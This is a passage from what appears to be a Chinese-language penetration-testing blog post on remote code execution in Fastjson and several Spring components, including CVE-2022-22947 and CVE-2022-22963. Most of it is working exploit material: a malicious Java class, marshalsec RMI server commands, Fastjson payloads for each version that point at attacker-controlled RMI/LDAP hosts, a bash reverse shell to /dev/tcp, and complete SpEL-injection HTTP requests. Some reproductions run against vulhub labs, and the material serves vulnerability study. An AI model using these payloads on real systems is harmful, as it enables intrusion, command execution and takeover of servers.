<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastjson采用黑白名单的方法来防御反序列化漏洞，导致当黑客不断发掘新的可攻击的反序列化Gadgets类时，则可能可以绕过黑白名单防御机制，造成远程命令执行或者SSRF漏洞</span><br></pre></td></tr></table></figure>

<p><strong>fastjson &lt;&#x3D;1.2.68 反序列化RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastjson采用黑白名单的方法来防御反序列化漏洞，导致当黑客不断发掘新的反序列化Gadgets类时，在autoType关闭的情况下仍然可能可以绕过黑白名单防御机制，造成远程命令执行漏洞。该漏洞利用门槛较低，可绕过autoType，风险影响较大</span><br></pre></td></tr></table></figure>

<p><strong>fastjson &lt; 1.2.70 反序列化RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.2.70新增多个autoType反序列化利用Gadgets黑名单类:</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections4.Transformer</span><br><span class="line">org.apache.commons.collections4.functors</span><br><span class="line">org.jdom2.transform.</span><br><span class="line">org.apache.hadoop.shaded.com.zaxxer.hikari.</span><br><span class="line">org.apache.activemq.pool.</span><br><span class="line">org.apache.aries.transaction.</span><br><span class="line">org.apache.activemq.ActiveMQConnectionFactory</span><br><span class="line">org.apache.activemq.spring.</span><br><span class="line">org.apache.activemq.ActiveMQXAConnectionFactory</span><br><span class="line">org.apache.commons.jelly.</span><br><span class="line">org.apache.axis2.transport.jms.</span><br><span class="line">com.p6spy.engine.</span><br></pre></td></tr></table></figure>

<h3 id="2-漏洞复现及利用"><a href="#2-漏洞复现及利用" class="headerlink" title="2. 漏洞复现及利用"></a>2. 漏洞复现及利用</h3><p>以Fastjson 1.2.4为例，目标环境是Java 8u102，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令</p>
<p><strong>a. 构造恶意java类</strong></p>
<p>编译并上传命令执行，如：<a href="http://rhost:rport/Exploit.class">http://rhost:rport/Exploit.class</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Exploit&#123;</span><br><span class="line">    public Exploit() throws Exception &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;touch /zydx666&quot;&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        while((line = reader.readLine()) != null) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用javac命令编译Exploit.java文件，生成一个Exploit.class文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>

<p>在远程主机上启一个http服务，需要能访问到Exploit.class文件，如使用python3启动http服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server --bind 0.0.0.0 2233</span><br></pre></td></tr></table></figure>

<p><strong>b. 开启远程方法调用rmi服务</strong></p>
<p>使用marshalsec项目，启动一个RMI服务器，监听6699端口，并制定加载远程类Exploit.class：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://rhost:2233/#Exploit&quot; 6699</span><br></pre></td></tr></table></figure>

<p><strong>c. 攻击机发送payload</strong></p>
<p>向存在漏洞的目标机发送fastjson反序列化漏洞payload，带上RMI的地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: target-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://rhost:6699/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时目标主机收到POST请求，触发反序列化漏洞，最终执行恶意Exploit.class</p>
<h3 id="3-各版本payload"><a href="#3-各版本payload" class="headerlink" title="3. 各版本payload"></a>3. 各版本payload</h3><p><strong>fastjson&lt;&#x3D;1.2.24</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1099/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p><strong>fastjson&lt;&#x3D;1.2.41</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1098/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p><strong>fastjson&lt;&#x3D;1.2.42</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p><strong>fastjson&lt;&#x3D;1.2.43</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p><strong>fastjson&lt;&#x3D;1.2.45</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap://localhost:1399/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>fastjson&lt;&#x3D;1.2.47</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">        &quot;dataSourceName&quot;: &quot;ldap://x.x.x.x:1999/Exploit&quot;, </span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>fastjson&lt;&#x3D;1.2.62</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi://127.0.0.1:1098/exploit&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>fastjson&lt;&#x3D;1.2.66</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/whoami&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/whoami&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/whoami&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://192.168.80.1:1399/whoami&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/releases">https://github.com/alibaba/fastjson/releases</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/security_update_20200601">https://github.com/alibaba/fastjson/wiki/security_update_20200601</a></li>
<li><a target="_blank" rel="noopener" href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/">https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1192/">https://paper.seebug.org/1192/</a></li>
<li><a target="_blank" rel="noopener" href="https://su18.org/post/fastjson/">https://su18.org/post/fastjson/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mrknow001/fastjson_rec_exploit">https://github.com/mrknow001/fastjson_rec_exploit</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/pmiaowu/BurpFastJsonScan">https://github.com/pmiaowu/BurpFastJsonScan</a></li>
</ul>
<h2 id="0x02-Spring系列"><a href="#0x02-Spring系列" class="headerlink" title="0x02 Spring系列"></a>0x02 Spring系列</h2><h3 id="1-Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）"><a href="#1-Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）" class="headerlink" title="1. Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）"></a>1. Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</h3><p>Pivotal Spring Web Flow是美国Pivotal Software公司的一款Web应用程序，可提供登机手续办理、贷款申请或购物车结算等导航。</p>
<p>Pivotal Spring Web Flow 2.4.0至2.4.4版本中存在远程代码执行漏洞。由于在的数据绑定上未能指定相关的具体属性，从而导致恶意的SpEL表达式可以通过表单提交并且被执行，攻击者可利用漏洞执行任意代码</p>
<p><strong>测试环境</strong></p>
<p>通过vulhub搭建，环境启动后，访问<a href="http://your-ip:8080，将看到一个酒店预订的页面">http://your-ip:8080，将看到一个酒店预订的页面</a></p>
<p><strong>漏洞利用</strong></p>
<p>首先访问<code>http://your-ip:8080/login</code>，用页面左边给出的任意一个账号&#x2F;密码登录系统</p>
<p>然后访问id为1的酒店<code>http://your-ip:8080/hotels/1</code>，点击预订按钮”Book Hotel”，填写相关信息后点击”Process”</p>
<p>再点击确认”Confirm”</p>
<p>此时抓包，抓到一个POST数据包，向其中添加一个字段（也就是反弹shell的POC, 需URL编码）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1&quot;)).start()=vulhub</span><br></pre></td></tr></table></figure>

<p>成功执行，获得shell</p>
<h3 id="2-Spring-Messaging-远程命令执行漏洞（CVE-2018-1270）"><a href="#2-Spring-Messaging-远程命令执行漏洞（CVE-2018-1270）" class="headerlink" title="2. Spring Messaging 远程命令执行漏洞（CVE-2018-1270）"></a>2. Spring Messaging 远程命令执行漏洞（CVE-2018-1270）</h3><p><strong>漏洞描述</strong></p>
<p>spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用StandardEvaluationContext解析，造成命令执行漏洞</p>
<p><strong>漏洞复现</strong></p>
<p>通过vulhub搭建，环境启动后，访问<code>http://your-ip:8080</code>可看到一个Web页面</p>
<p>该漏洞是订阅的时候插入SpEL表达式，而对方向这个订阅发送消息时才会触发，所以需要指定的信息有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1)基础地址，在vulhub中为http://your-ip:8080/gs-guide-websocket</span><br><span class="line"></span><br><span class="line">2) 待执行的SpEL表达式，如T(java.lang.Runtime).getRuntime().exec(&#x27;touch /tmp/success&#x27;)</span><br><span class="line"></span><br><span class="line">3) 某一个订阅的地址，如vulhub中为：/topic/greetings</span><br><span class="line"></span><br><span class="line">4) 如何触发这个订阅，即如何让后端向这个订阅发送消息。在vulhub中，向/app/hello发送一个包含name的json，即可触发这个事件</span><br></pre></td></tr></table></figure>

<p>根据需求修改POC, vulhub环境，只需修改1中的url即可</p>
<p>执行<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py">exploit.py</a>，进入容器docker-compose exec spring bash，可见&#x2F;tmp&#x2F;success已成功创建</p>
<h3 id="3-Spring-Data-Commons-远程命令执行漏洞（CVE-2018-1273）"><a href="#3-Spring-Data-Commons-远程命令执行漏洞（CVE-2018-1273）" class="headerlink" title="3. Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）"></a>3. Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</h3><p><strong>漏洞描述</strong></p>
<p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令</p>
<p><strong>漏洞利用</strong></p>
<p>通过vulhub搭建，环境启动后，访问<a target="_blank" rel="noopener" href="http://your-ip:8080/users%EF%BC%8C%E5%B0%86%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E9%A1%B5%E9%9D%A2">http://your-ip:8080/users，将可以看到一个用户注册页面</a></p>
<p>在注册的时候抓包，并修改成如下数据包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /users?page=&amp;size=5 HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 124</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: http://localhost:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://localhost:8080/users?page=0&amp;size=5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"></span><br><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/success&quot;)]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure>

<p>执行docker-compose exec spring bash进入容器中，可见成功创建&#x2F;tmp&#x2F;success，说明命令执行成功</p>
<h3 id="4-Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行（CVE-2022-22947）"><a href="#4-Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行（CVE-2022-22947）" class="headerlink" title="4. Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）"></a>4. Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）</h3><p><strong>漏洞描述</strong></p>
<p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub启动一个使用了Spring Cloud Gateway 3.1.0的Web服务，服务启动后，访问<a href="http://your-ip:8080即可看到演示页面">http://your-ip:8080即可看到演示页面</a></p>
<p>1）首先，发送如下数据包即可添加一个包含恶意SpEL表达式的路由：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 329</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;hacktest&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>然后，发送如下数据包应用刚添加的路由。这个数据包将触发SpEL表达式的执行</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<p>发送如下数据包即可查看执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>最后，发送如下数据包清理现场，删除所添加的路由</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DELETE /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>再刷新下路由：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<h3 id="5-Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）"><a href="#5-Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）" class="headerlink" title="5. Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）"></a>5. Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）</h3><p><strong>漏洞描述</strong></p>
<p>Spring Cloud Function是基于 Spring Boot 的函数框架。由于 Spring Cloud Function 对用户输入的参数安全处理不严，未授权的攻击者可构造特定的数据包，通过特定的 HTTP 请求头进行 SpEL 表达式注入攻击，从而可执行任意的恶意 Java 代码，获取服务权限</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub启动一个使用Spring Cloud Function 3.2.2编写的服务器：服务启动后，执行curl <a target="_blank" rel="noopener" href="http://your-ip:8080/uppercase">http://your-ip:8080/uppercase</a> -H “Content-Type: text&#x2F;plain” –data-binary test即可执行uppercase函数，将输入字符串转换成大写</p>
<p>发送如下数据包，spring.cloud.function.routing-expression头中包含的SpEL表达式将会被执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/success&quot;)</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure>

